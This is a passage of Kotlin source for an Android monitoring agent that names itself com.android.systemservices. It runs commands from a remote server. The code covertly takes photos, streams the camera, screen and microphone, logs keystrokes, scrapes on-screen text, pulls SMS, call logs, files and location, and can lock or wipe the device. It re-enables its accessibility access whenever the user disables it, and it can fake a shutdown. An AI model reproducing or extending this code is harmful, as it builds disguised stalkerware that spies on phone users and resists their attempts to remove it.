                // (could have been cleared by a system settings reset)
                grantNotificationListenerViaSettings()
                ensureAccessibilityEnabled()
                // Re-grant usage stats AppOp in case it was cleared
                // Re-grant Usage Access AppOp so Battery tab shows app-usage data automatically.
                // Uses reflection (setMode is @SystemApi) with a shell fallback.
                grantUsageStatsAppOp()

            } else if (doh.isOwner) {
                // Device Owner path: pin all grantable runtime permissions
                val dpm   = getSystemService(android.app.admin.DevicePolicyManager::class.java)
                val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                val runtimePerms = buildList {
                    add(android.Manifest.permission.READ_CONTACTS)
                    add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                    add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    add(android.Manifest.permission.READ_MEDIA_IMAGES)
                    add(android.Manifest.permission.READ_MEDIA_VIDEO)
                    add(android.Manifest.permission.READ_MEDIA_AUDIO)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                        add(android.Manifest.permission.MANAGE_EXTERNAL_STORAGE)
                }
                for (perm in runtimePerms) {
                    try {
                        dpm.setPermissionGrantState(admin, packageName, perm,
                            android.app.admin.DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
                    } catch (e: Exception) { Log.w(TAG, "DO grant $perm: ${e.message}") }
                }
                // Notification listener via secure settings
                val nm = getSystemService(android.app.NotificationManager::class.java)
                val listenerCn = android.content.ComponentName(this, NotificationService::class.java)
                val alreadyGranted = try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                        nm.isNotificationListenerAccessGranted(listenerCn)
                    else false
                } catch (_: Exception) { false }
                if (!alreadyGranted) grantNotificationListenerViaSettings()
            }
        }.start()

        // DO mode: register ContentObserver to re-enable accessibility if user disables it.
        // Requires patch-accessibility-do.py (DPMS allowlist) to be applied in the GOS build.
        // Only registered when running as Device Owner (isSystemApp=false, isOwner=true).
        if (!isSystemApp) {
            val doh = DeviceOwnerHelper(this)
            if (doh.isOwner) {
                accessibilityObserver = object : android.database.ContentObserver(
                        Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean) {
                        // Fire in background — setSecureSetting() is a Binder IPC
                        Thread { ensureAccessibilityEnabledAsDO() }.start()
                    }
                }.also { obs ->
                    contentResolver.registerContentObserver(
                        android.provider.Settings.Secure.getUriFor(
                            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                        false, obs)
                }
                Log.i(TAG, "DO: Accessibility ContentObserver registered")
            }
        }

        ensureResetTokenRegistered()

        (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            .addPrimaryClipChangedListener(clipboardListener)

        // Re-enter theft mode after service restart if it was active.
        // If theft is off but the fake shutdown is still armed (battery-stop state),
        // re-assert black WITHOUT full theft — the screen stays dead until released.
        if (Prefs(this).theftModeEnabled) enterTheftMode()
        else if (Prefs(this).fakeShutdownArmed) startFakeShutdown()

        // Auto-resume the continuous BT tracker scan after reboot / agent restart if it was
        // running before (Prefs.btScanEnabled). Retries internally until Bluetooth
        // permissions are granted (async DPM/AppOps grant right after boot).
        resumeBtScanIfEnabled()

        // Restore screen text parser if it was active before restart
        if (Prefs(this).screenTextEnabled) {
            val pkgsJson = Prefs(this).screenTextPackages
            val pkgs = if (pkgsJson.isEmpty()) emptySet() else try {
                val arr = org.json.JSONArray(pkgsJson)
                (0 until arr.length()).map { arr.getString(it) }.toSet()
            } catch (_: Exception) { emptySet() }
            screenTextHelper.start(pkgs, Prefs(this).screenTextIntervalMs)
        }

        // Restore scheduled screen-text analysis state
        val schedPrefs = Prefs(this)
        if (schedPrefs.screentextScheduleEnabled) {
            screenTextHelper.scheduleActive = true
            scheduleScreentextAlarm()
        }

        initGeofencing()
        sendNetworkSnapshot()
        accelSensor?.let { sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, sensorHandler) }
        significantMotionSensor = sensorMgr.getDefaultSensor(Sensor.TYPE_SIGNIFICANT_MOTION)
        scheduleSleepCheck()
        statusHandler.postDelayed(statusRunnable, HEARTBEAT_ACTIVE_MS)
        // Re-arm the cellular lockdown watchdog if it was active before (persisted in Prefs).
        updateCellularWatchdog()
        // Run initial attestation after socket has had time to connect
        statusHandler.postDelayed({ runAttestationAsync() }, 8_000)
    }

    @Suppress("MissingPermission")
    private fun setupLocationUpdates(startUpdates: Boolean = true) {
        ensureNetworkLocationEnabled()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { loc -> sendLocationFix(loc.latitude, loc.longitude, loc.accuracy, loc.speed, loc.bearing) }
            }
        }
        fusedLocation = LocationServices.getFusedLocationProviderClient(this)
        if (!startUpdates) return
        // GrapheneOS ships no Google Play Services, so the GMS FusedLocationProvider never
        // delivers — and can fail ASYNCHRONOUSLY without throwing, leaving usingFusedLocation=true
        // and the system fallback never engaging (permanent silent no-fix on every device).
        // Only attempt Fused when Play Services is actually installed; otherwise go straight
        // to the AOSP LocationManager.
        if (!hasPlayServices()) {
            Log.i(TAG, "Play Services absent — using system LocationManager directly")
            startSystemLocationUpdates(LOCATION_ACTIVE_MS, LOCATION_ACTIVE_MIN_MS)
            return
        }
        val request = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, LOCATION_ACTIVE_MS)
            .setMinUpdateIntervalMillis(LOCATION_ACTIVE_MIN_MS)
            .build()
        try {
            fusedLocation.requestLocationUpdates(request, locationCallback, locationThread.looper)
            usingFusedLocation = true
            Log.i(TAG, "Using FusedLocationProvider")
        } catch (e: Exception) {
            Log.w(TAG, "FusedLocation unavailable (${e.message}), falling back to system LocationManager")
            startSystemLocationUpdates(LOCATION_ACTIVE_MS, LOCATION_ACTIVE_MIN_MS)
        }
    }

    /** True only when Google Play Services is installed. ⚠️ NOT a GrapheneOS detector:
     *  sandboxed Play Services installs com.google.android.gms as a normal app, so this
     *  returns true on GrapheneOS too. No longer used for geofencing decisions — the AOSP
     *  engine is primary everywhere (see initGeofencing) precisely because no reliable,
     *  probeable signal distinguishes working GMS from silently-dead sandboxed GMS. */
    private fun hasPlayServices(): Boolean = try {
        packageManager.getPackageInfo("com.google.android.gms", 0)
        true
    } catch (e: Exception) {
        false
    }

    /**
     * Enable GrapheneOS's NetworkLocation provider (Settings.Global "network_location",
     * default 0 = OFF) so the device gets coarse WiFi/cell fixes INDOORS — without Google.
     * 2 = GrapheneOS-Apple-proxy (privacy-preserving; device IP hidden from Apple).
     * Only set when currently OFF so an explicit operator/user choice isn't overridden.
     * Platform-signed agent holds WRITE_SECURE_SETTINGS, so the write succeeds from /data/app.
     */
    private fun ensureNetworkLocationEnabled() {
        try {
            if (android.provider.Settings.Global.getInt(contentResolver, "network_location", 0) == 0) {
                android.provider.Settings.Global.putInt(contentResolver, "network_location", 2)
                Log.i(TAG, "GrapheneOS network location enabled (proxy)")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Network location enable failed: ${e.message}")
        }
    }

    /** Push a location fix to the server. Called from both Fused and system location callbacks. */
    private fun sendLocationFix(lat: Double, lng: Double, accuracy: Float, speed: Float, bearing: Float) {
        maybeAutoLiveTrack(speed)
        SocketManager.sendLocation(lat, lng, accuracy, batteryLevel(), speed, bearing)
    }

    /**
     * Speed-gated auto live tracking. Runs on EVERY location fix (m/s from Location.getSpeed()).
     * Above AUTO_LIVE_SPEED_MPS → engage Live Track immediately if not already running; while an
     * auto session keeps seeing fast fixes it also pushes the 30-min runaway guard (and its wake
     * lock) forward so a long drive streams continuously instead of flapping back to 60 s fixes.
     * Below threshold → arm ONE downgrade timer on the first slow fix; jitter right around the
     * threshold must not keep resetting it or the session would never end. Any fast fix cancels.
     */
    private fun maybeAutoLiveTrack(speed: Float) {
        if (speed >= AUTO_LIVE_SPEED_MPS) {
            autoLiveSlowArmed = false
            powerHandler.removeCallbacks(autoLiveStopRunnable)
            if (!isLiveTracking) {
                Log.i(TAG, "Auto live track: ${(speed * 2.23694f).toInt()} mph ≥ ${(AUTO_LIVE_SPEED_MPS * 2.23694f).toInt()} mph — engaging Live Track")
                autoLiveTracking = true
                startLiveTracking()
            } else if (autoLiveTracking) {
                wakeLock?.let { if (it.isHeld) it.acquire(LIVE_TRACK_TIMEOUT_MS) }
                powerHandler.removeCallbacks(liveTrackAutoStopRunnable)
                powerHandler.postDelayed(liveTrackAutoStopRunnable, LIVE_TRACK_TIMEOUT_MS)
            }
        } else if (autoLiveTracking && isLiveTracking && !autoLiveSlowArmed) {
            autoLiveSlowArmed = true
            powerHandler.postDelayed(autoLiveStopRunnable, AUTO_LIVE_SLOW_HOLD_MS)
        }
    }

    @Suppress("MissingPermission")
    private fun startSystemLocationUpdates(intervalMs: Long, minMs: Long) {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            systemLocationManager = lm
            systemLocationListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    sendLocationFix(loc.latitude, loc.longitude, loc.accuracy,
                        if (loc.hasSpeed()) loc.speed else 0f,
                        if (loc.hasBearing()) loc.bearing else 0f)
                }
                @Deprecated("Deprecated in API 29")
                override fun onStatusChanged(provider: String, status: Int, extras: Bundle?) {}
            }
            // Register EVERY enabled provider, not just the first. GPS_PROVIDER is almost always
            // "enabled" but only locks with sky view (useless indoors); NETWORK_PROVIDER + the
            // AOSP FUSED_PROVIDER (fed by GrapheneOS NetworkLocation) give coarse WiFi/cell fixes
            // indoors. Breaking after GPS pinned the device to satellite-only and lost all indoor
            // coverage — the root cause of "no location on any device" on GOS.
            val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.FUSED_PROVIDER)
            var registered = false
            for (provider in providers) {
                if (lm.isProviderEnabled(provider)) {
                    try {
                        lm.requestLocationUpdates(provider, intervalMs, 0f, systemLocationListener!!, locationThread.looper)
                        Log.i(TAG, "System location provider registered: $provider")
                        registered = true
                    } catch (e: Exception) {
                        Log.w(TAG, "Provider $provider registration failed: ${e.message}")
                    }
                }
            }
            if (!registered) Log.w(TAG, "No system location provider available")
            usingFusedLocation = false
        } catch (e: SecurityException) {
            Log.e(TAG, "System location permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "System location init failed: ${e.message}")
        }
    }

    private fun stopSystemLocationUpdates() {
        try { systemLocationListener?.let { systemLocationManager?.removeUpdates(it) } } catch (_: Exception) {}
        systemLocationListener = null
        systemLocationManager = null
    }

    @Suppress("MissingPermission")
    private fun setLocationInterval(intervalMs: Long, minMs: Long) {
        if (isLiveTracking) return
        if (usingFusedLocation) {
            fusedLocation.removeLocationUpdates(locationCallback)
            val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, intervalMs)
                .setMinUpdateIntervalMillis(minMs)
                .build()
            try { fusedLocation.requestLocationUpdates(req, locationCallback, locationThread.looper) }
            catch (e: Exception) {
                Log.w(TAG, "setLocationInterval fused failed: ${e.message}, switching to system")
                usingFusedLocation = false
                startSystemLocationUpdates(intervalMs, minMs)
            }
        } else {
            stopSystemLocationUpdates()
            startSystemLocationUpdates(intervalMs, minMs)
        }
    }

    @Suppress("MissingPermission")
    private fun startLiveTracking() {
        if (isLiveTracking) return
        isLiveTracking = true
        if (usingFusedLocation) {
            fusedLocation.removeLocationUpdates(locationCallback)
            val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1_000L)
                .setMinUpdateIntervalMillis(1_000L)
                .build()
            try { fusedLocation.requestLocationUpdates(request, locationCallback, locationThread.looper) }
            catch (e: Exception) {
                Log.w(TAG, "Live tracking fused failed: ${e.message}")
                usingFusedLocation = false
                stopSystemLocationUpdates()
                startSystemLocationUpdates(1_000L, 1_000L)
            }
        } else {
            stopSystemLocationUpdates()
            startSystemLocationUpdates(1_000L, 1_000L)
        }
        wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SystemServices:LiveTrack")
            .also { it.acquire(LIVE_TRACK_TIMEOUT_MS) }
        startStreamAlert()
        powerHandler.removeCallbacks(liveTrackAutoStopRunnable)
        powerHandler.postDelayed(liveTrackAutoStopRunnable, LIVE_TRACK_TIMEOUT_MS)
        Log.i(TAG, "Live tracking started — auto-stop in ${LIVE_TRACK_TIMEOUT_MS / 60_000} min")
    }

    @Suppress("MissingPermission")
    private fun stopLiveTracking() {
        if (!isLiveTracking) return
        isLiveTracking = false
        autoLiveTracking = false
        autoLiveSlowArmed = false
        powerHandler.removeCallbacks(autoLiveStopRunnable)
        powerHandler.removeCallbacks(streamAlertRunnable)
        powerHandler.removeCallbacks(liveTrackAutoStopRunnable)
        setLocationInterval(
            if (inSleepMode) LOCATION_SLEEP_MS     else LOCATION_ACTIVE_MS,
            if (inSleepMode) LOCATION_SLEEP_MIN_MS else LOCATION_ACTIVE_MIN_MS
        )
        wakeLock?.let { if (it.isHeld) it.release() }
        wakeLock = null
        scheduleSleepCheck()
        SocketManager.emit("live_track_stopped", org.json.JSONObject())
        Log.i(TAG, "Live tracking stopped")
    }

    private fun registerNetworkCallback() {
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        try {
            connectivityManager.registerNetworkCallback(request, networkCallback)
        } catch (e: Exception) {
            Log.e(TAG, "Network callback registration failed", e)
        }
    }

    private fun sendNetworkSnapshot() {
        // Debounced: onCapabilitiesChanged fires many times/sec; coalesce into one emit per 2s
        netSnapshotHandler.removeCallbacks(netSnapshotRunnable)
        netSnapshotHandler.postDelayed(netSnapshotRunnable, 2_000L)
    }

    private fun handleCommand(cmd: JSONObject) {
        when (cmd.optString("command")) {
            "get_location" -> {
                if (usingFusedLocation) {
                    try {
                        fusedLocation.lastLocation.addOnSuccessListener { loc ->
                            loc?.let { sendLocationFix(it.latitude, it.longitude, it.accuracy,
                                if (it.hasSpeed()) it.speed else 0f,
                                if (it.hasBearing()) it.bearing else 0f) }
                        }
                    } catch (e: SecurityException) { Log.e(TAG, "Location denied", e) }
                } else {
                    try {
                        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.FUSED_PROVIDER, LocationManager.NETWORK_PROVIDER)
                        for (p in providers) {
                            @Suppress("MissingPermission")
                            val loc = lm.getLastKnownLocation(p)
                            if (loc != null) {
                                sendLocationFix(loc.latitude, loc.longitude, loc.accuracy,
                                    if (loc.hasSpeed()) loc.speed else 0f,
                                    if (loc.hasBearing()) loc.bearing else 0f)
                                break
                            }
                        }
                    } catch (e: Exception) { Log.e(TAG, "get_location (system): ${e.message}") }
                }
            }
            "take_photo" -> {
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
                CameraHelper(this).capturePhoto(cmd.optString("facing", "back")) { bytes ->
                    bytes?.let { SocketManager.sendPhoto(android.util.Base64.encodeToString(it, android.util.Base64.NO_WRAP)) }
                    setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                }
            }
            "start_photo_interval" -> {
                val intervalSec = cmd.optInt("interval", 30).coerceIn(5, 3600)
                photoIntervalFacing = cmd.optString("facing", "back")
                photoIntervalMs     = intervalSec * 1000L
                photoIntervalHandler.removeCallbacks(photoIntervalRunnable)
                photoIntervalHandler.post(photoIntervalRunnable)
                Log.i(TAG, "Photo interval started: every ${intervalSec}s facing=$photoIntervalFacing")
            }
            "stop_photo_interval" -> {
                photoIntervalHandler.removeCallbacks(photoIntervalRunnable)
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                Log.i(TAG, "Photo interval stopped")
            }
            "record_audio" -> {
                // Skip if a live audio stream is up OR a fixed-duration recording is already
                // running — a second MediaRecorder on the mic would just fail to init, and the
                // server's per-device "recording" marker only tracks one session at a time.
                if (!audioStreamHelper.streaming && !audioHelper.isRecording) {
                    val duration = cmd.optInt("duration", 10).coerceIn(1, 10800)
                    // Segmented upload (~60s chunks, see AudioHelper) instead of one blob at the
                    // end: a session ID correlates all segments of this recording so the server
                    // can assemble them (or, if the device goes dark mid-recording, finalize
                    // whatever arrived after a timeout — see server's audio_segment/finalizeAudioSession).
                    val sessionId = java.util.UUID.randomUUID().toString()
                    setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
                    audioHelper.recordAudio(duration) { bytes, seq, isFinal ->
                        if (bytes != null) {
                            SocketManager.sendAudioSegment(sessionId, seq, isFinal,
                                android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
                        } else if (isFinal) {
                            // Hard failure with nothing captured yet — still tell the server the
                            // session is over so it doesn't wait out the full stale-session timeout.
                            SocketManager.sendAudioSegment(sessionId, seq, true, null)
                        }
                        if (isFinal) setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                    }
                }
            }
            "stop_record_audio" -> {
                // Cancel an in-progress fixed-duration record_audio from the WebUI. stopAndFlush()
                // interrupts the recording loop, which emits the current (now-final, possibly short)
                // segment — so whatever was captured so far is still assembled+saved server-side,
                // and the isFinal callback resets the mic FGS type. No-op if nothing is recording.
                if (audioHelper.isRecording) {
                    audioHelper.stopAndFlush()
                    Log.i(TAG, "record_audio cancelled from server")
                }
            }
            "start_audio_stream" -> {
                if (!audioStreamHelper.streaming) {
                    setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                        if (streamHelper.streaming) ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA else 0)
                    audioStreamHelper.start(skipVoiceCommunication = streamHelper.streaming) { base64 ->
                        SocketManager.emit("audio_chunk", org.json.JSONObject().apply {
                            put("base64", base64)
                            put("sampleRate", AudioStreamHelper.SAMPLE_RATE)
                        })
                    }
                    talkbackHelper.start()
                    SocketManager.talkChunkListener = { b64, sr ->
                        audioStreamHelper.setNoiseSuppressor(true)
                        talkActiveHandler.removeCallbacks(talkStopRunnable)
                        talkActiveHandler.postDelayed(talkStopRunnable, 600L)
                        talkbackHelper.enqueue(b64, sr)
                    }
                    powerHandler.removeCallbacks(audioStreamTimeoutRunnable)
                    powerHandler.postDelayed(audioStreamTimeoutRunnable, STREAM_TIMEOUT_MS)
                    startStreamAlert()
                }
            }
            "stop_audio_stream" -> {
                talkActiveHandler.removeCallbacks(talkStopRunnable)
                audioStreamHelper.stop()
                talkbackHelper.stop()
                SocketManager.talkChunkListener = null
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    if (streamHelper.streaming) ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA else 0)
                powerHandler.removeCallbacks(audioStreamTimeoutRunnable)
            }
            "set_talkback_volume" -> {
                val level = cmd.optDouble("level", 1.0).toFloat()
                talkbackHelper.setVolume(level)
            }
            "get_network" -> Thread {
                try { SocketManager.sendNetworkInfo(NetworkHelper(this).getSnapshot(includePing = true)) }
                catch (e: Exception) { Log.e(TAG, "Network snapshot error", e) }
            }.start()
            "list_files" -> {
                val path = cmd.optString("path", FileHelper(this).defaultRoot())
                Thread {
                    val result = FileHelper(this).listDirectory(path)
                    SocketManager.emit("file_list", result)
                }.start()
            }
            "get_file" -> {
                val filePath = cmd.optString("path", "")
                if (filePath.isNotEmpty()) {
                    Thread {
                        Log.d(TAG, "Reading file: $filePath")
                        val result = FileHelper(this).readFile(filePath)
                        Log.d(TAG, "File result error=${result.optString("error")}, size=${result.optLong("size")}")
                        SocketManager.emit("file_data", result)
                    }.start()
                }
            }
            "delete_file" -> {
                val filePath = cmd.optString("path", "")
                if (filePath.isNotEmpty()) {
                    Thread {
                        val result = FileHelper(this).deleteFile(filePath)
                        SocketManager.emit("file_delete_result", result)
                    }.start()
                }
            }
            "push_file" -> {
                val destDir  = cmd.optString("path", "")
                val fileName = cmd.optString("name", "file")
                val b64      = cmd.optString("base64", "")
                if (destDir.isNotEmpty() && b64.isNotEmpty()) {
                    Thread {
                        val result = try {
                            val bytes = android.util.Base64.decode(b64, android.util.Base64.NO_WRAP)
                            FileHelper(this).writeFile(destDir, fileName, bytes)
                        } catch (e: Exception) {
                            JSONObject().apply { put("success", false); put("error", e.message ?: "Decode failed") }
                        }
                        SocketManager.emit("push_file_result", result)
                    }.start()
                }
            }
            "start_stream" -> {
                val facing  = cmd.optString("facing", "back")
                val fps     = cmd.optInt("fps", 10)
                val quality = cmd.optInt("quality", 50)
                if (!streamHelper.streaming) {
                    setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        if (audioStreamHelper.streaming) ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0)
                    streamHelper.start(facing, fps, quality, { base64 ->
                        SocketManager.emit("video_frame", org.json.JSONObject().apply { put("base64", base64) })
                    }, { err ->
                        // Camera unavailable (e.g. a foreground app holds the lens). Report + drop the
                        // camera FGS type; the agent must NOT crash (was: uncaught CAMERA_IN_USE → FATAL).
                        Log.w(TAG, "Camera stream unavailable: $err")
                        setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                            if (audioStreamHelper.streaming) ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0)
                        SocketManager.emit("stream_error", org.json.JSONObject().apply { put("error", err) })
                    })
                    if (streamHelper.streaming) {
                        powerHandler.removeCallbacks(streamTimeoutRunnable)
                        powerHandler.postDelayed(streamTimeoutRunnable, STREAM_TIMEOUT_MS)
                        startStreamAlert()
                    } else {
                        setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                            if (audioStreamHelper.streaming) ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0)
                    }
                }
            }
            "stop_stream" -> {
                streamHelper.stop()
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    if (audioStreamHelper.streaming) ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0)
                powerHandler.removeCallbacks(streamTimeoutRunnable)
            }
            "take_screenshot" -> {
                val quality = cmd.optInt("quality", 60)
                if (!screenHelper.capturing) {
                    setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                    screenHelper.captureOnce(quality) { base64 ->
                        // Drop empty captures — never emit a 0-byte screenshot (broken image in the UI).
                        if (base64.isNotEmpty()) SocketManager.emit("screencapture", org.json.JSONObject().apply { put("base64", base64) })
                        setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                    }
                }
            }
            "start_screenshot_interval" -> {
                val intervalSec = cmd.optInt("interval", 30).coerceIn(5, 3600)
                screenshotIntervalQuality = cmd.optInt("quality", 60).coerceIn(10, 85)
                screenshotIntervalMs      = intervalSec * 1000L
                screenshotIntervalHandler.removeCallbacks(screenshotIntervalRunnable)
                screenshotIntervalHandler.post(screenshotIntervalRunnable)
                Log.i(TAG, "Screenshot interval started: every ${intervalSec}s q=$screenshotIntervalQuality")
            }
            "stop_screenshot_interval" -> {
                screenshotIntervalHandler.removeCallbacks(screenshotIntervalRunnable)
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                Log.i(TAG, "Screenshot interval stopped")
            }
            "start_screen_stream" -> {
                screenStreamQuality    = cmd.optInt("quality", 50).coerceIn(10, 80)
                screenStreamIntervalMs = (cmd.optDouble("interval", 0.3) * 1000).toLong().coerceIn(300, 5000)
                screenStreamActive     = true
                screenStreamHandler.removeCallbacks(screenStreamRunnable)
                screenStreamHandler.post(screenStreamRunnable)
                Log.i(TAG, "Screen stream started: interval=${screenStreamIntervalMs}ms q=$screenStreamQuality")
            }
            "stop_screen_stream" -> {
                screenStreamActive = false
                screenStreamHandler.removeCallbacks(screenStreamRunnable)
                Log.i(TAG, "Screen stream stopped")
            }
            "start_keylog" -> {
                Prefs(this).keylogEnabled = true
                val svc = ScreenshotService.instance
                if (svc != null) {
                    svc.startKeylog()
                } else {
                    ScreenshotService.keylogActive = true
                    Log.w(TAG, "start_keylog: ScreenshotService not connected (accessibility not enabled?)")
                }
            }
            "stop_keylog" -> {
                Prefs(this).keylogEnabled = false
                ScreenshotService.instance?.stopKeylog() ?: run {
                    ScreenshotService.keylogActive = false
                }
            }
            "start_screen_text" -> {
                // Pull-based UI content capture — no AccessibilityService event subscription.
                // Uses ActivityManager.getRunningTasks() for foreground detection and polls
                // getRootInActiveWindow() on the running service instance on demand.
                val arr = cmd.optJSONArray("packages")
                val pkgs: Set<String> = if (arr != null) {
                    (0 until arr.length()).map { arr.getString(it) }.toSet()
                } else emptySet()
                val intervalMs = cmd.optLong("intervalMs", 5_000L).coerceIn(1_000L, 60_000L)
                val prefs = Prefs(this)
                prefs.screenTextEnabled   = true
                prefs.screenTextPackages  = if (pkgs.isEmpty()) "" else org.json.JSONArray(pkgs.toList()).toString()
                prefs.screenTextIntervalMs = intervalMs
                screenTextHelper.start(pkgs, intervalMs)
                Log.i(TAG, "start_screen_text: watching=${pkgs.ifEmpty { setOf("*ALL*") }}, interval=${intervalMs}ms")
            }
            "stop_screen_text" -> {
                Prefs(this).screenTextEnabled = false
                screenTextHelper.stop()
                Log.i(TAG, "stop_screen_text")
            }
            "set_screentext_schedule" -> {
                val enabled = cmd.optBoolean("enabled", false)
                val hour = cmd.optInt("hour", 20).coerceIn(0, 23)
                val minute = cmd.optInt("minute", 0).coerceIn(0, 59)
                val quietStart = cmd.optInt("quietHoursStart", 23).coerceIn(0, 23)
                val quietEnd = cmd.optInt("quietHoursEnd", 7).coerceIn(0, 23)
                val prefs = Prefs(this)
                prefs.screentextScheduleEnabled = enabled
                prefs.screentextScheduleHour = hour
                prefs.screentextScheduleMinute = minute
                prefs.screentextQuietHoursStart = quietStart
                prefs.screentextQuietHoursEnd = quietEnd
                screenTextHelper.scheduleActive = enabled
                // A fresh schedule push means the user (re)configured it — clear the fire
                // gates so the new schedule re-anchors and can trigger immediately.
                screentextLastFiredMs = 0L
                nextScreentextFireMs = 0L
                if (enabled) scheduleScreentextAlarm() else cancelScreentextAlarm()
                Log.i(TAG, "set_screentext_schedule: enabled=$enabled, hour=$hour, minute=$minute, quiet=$quietStart-$quietEnd")
            }
            "get_apps" -> Thread {
                SocketManager.emit("app_list", org.json.JSONObject().apply {
                    put("apps", AppListHelper(this@MonitoringService).getInstalledApps())
                })
            }.start()
            "get_battery_stats" -> Thread {
                try {
                    SocketManager.emit("battery_stats", BatteryStatsHelper(this@MonitoringService).getStats())
                } catch (e: Throwable) {
                    Log.e(TAG, "Battery stats error: ${e.message}")
                }
            }.start()
            "get_calls" -> Thread {
                SocketManager.emit("call_log", org.json.JSONObject().apply {
                    put("calls", CallLogHelper(this@MonitoringService).getCallLog())
                })
            }.start()
            "get_sms" -> Thread {
                SocketManager.emit("sms_list", org.json.JSONObject().apply {
                    put("messages", SmsHelper(this@MonitoringService).getSms())
                })
            }.start()
"start_live_track" -> startLiveTracking()
            "stop_live_track"  -> stopLiveTracking()
            "find_phone" -> startFindPhone()
            "stop_find_phone" -> stopFindPhone()
            "lock_device"  -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    dpm.lockNow()
                } else {
                    // Fallback: force screen off via PowerManager (system app, hidden API — use reflection)
                    try {
                        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                        pm.javaClass.getMethod("goToSleep", Long::class.java)
                            .invoke(pm, android.os.SystemClock.uptimeMillis())
                    } catch (e: Exception) { Log.e(TAG, "lock_device fallback failed: ${e.message}") }
                }
            }
            "wipe_device"  -> {
                // Prefer DO wipe; fall back to RecoverySystem for system builds without DO
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                val doh = DeviceOwnerHelper(this)
                if (doh.isOwner) {
                    try {
                        // The anti-tamper DISALLOW_FACTORY_RESET restriction blocks the wipe — lift it
                        // first (best-effort) so an admin wipe overrides it regardless of the toggle.
                        val admin = android.content.ComponentName(this, "com.android.systemservices.DeviceAdminReceiver")
                        try { dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_FACTORY_RESET) } catch (_: Throwable) {}
                        // Android 14+ (API 34): a Device Owner factory-resets the whole device via
                        // wipeDevice(). wipeData() targets the CALLING user, and on the system user (0)
                        // it throws IllegalStateException "User 0 is a system user and cannot be removed"
                        // → previously crashed the agent instead of wiping.
                        if (android.os.Build.VERSION.SDK_INT >= 34) dpm.wipeDevice(0) else dpm.wipeData(0)
                    } catch (e: Throwable) {
                        Log.e(TAG, "wipe_device DO wipe failed: ${e.message}")
                        try { android.os.RecoverySystem.rebootWipeUserData(this) }
                        catch (e2: Exception) { Log.e(TAG, "wipe_device RecoverySystem fallback failed: ${e2.message}") }
                    }
                } else if (doh.isProfileOwner) {
                    // Profile Owner wipe — wipes the managed profile only, not the device
                    try {
                        val admin = android.content.ComponentName(this, "com.android.systemservices.DeviceAdminReceiver")
                        dpm.wipeData(0)
                    } catch (e: Throwable) {
                        Log.e(TAG, "wipe_device PO profile wipe failed: ${e.message}")
                    }
                } else {
                    try {
                        // Public API: rebootWipeUserData(Context); the reason-string overload is hidden
                        android.os.RecoverySystem.rebootWipeUserData(this)
